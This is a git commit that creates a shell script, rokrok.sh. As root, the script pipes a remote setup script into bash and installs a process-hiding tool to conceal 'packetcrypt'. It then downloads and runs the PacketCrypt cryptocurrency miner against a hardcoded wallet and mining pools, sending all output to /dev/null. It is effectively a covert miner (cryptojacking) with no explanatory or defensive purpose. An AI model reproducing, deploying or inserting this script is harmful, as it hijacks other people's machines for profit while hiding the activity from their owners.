1ee98e81a2e42b22d17cf60e5a8edc8bf8f306ec
huhajjsss811 <99829598+huhajjsss811@users.noreply.github.com>
2022-02-16 18:47:03 +0000

    Create rokrok.sh

---
+++ rokrok.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && ph add packetcrypt && wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1q983rz5pzezgdz2l5yaujajcp88rtg5yc2lsxx3 http://pool.pkt.world http://pool.pktpool.io -t 2 > /dev/null 2>&1"
